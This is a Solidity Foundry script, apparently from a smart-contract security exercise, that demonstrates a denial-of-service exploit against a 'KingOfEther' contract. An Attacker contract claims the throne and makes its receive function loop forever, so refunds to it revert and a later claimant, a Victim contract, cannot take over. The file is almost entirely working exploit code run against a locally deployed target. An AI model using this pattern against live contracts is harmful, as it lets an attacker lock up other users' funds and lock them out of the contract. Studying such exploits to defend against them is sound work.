// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/Kingether.sol";

contract Attacker {
    function dos(address _target) external payable {
        KingOfEther(_target).claimThrone{ value: msg.value }();
    }

    fallback() external payable { }
    receive() external payable { while(true) { } }
}

contract Victim {
    function claimThrone(address _target) external payable {
        KingOfEther(_target).claimThrone{ value: msg.value }();
    }
}

contract POC is Script {
    KingOfEther public target;
    Attacker public attacker;
    Victim public victim;
    address public hacker;

    function setUp() external {
        hacker = vm.addr(0x12345678);
        target = new KingOfEther();
        attacker = new Attacker();
        victim = new Victim();
        vm.deal(hacker, 2.1 ether);
    }

    function run() external {
        vm.startPrank(hacker);
        attacker.dos{ value: 1 ether }(address(target));
        victim.claimThrone{ value: 1.1 ether }(address(target));
    }
}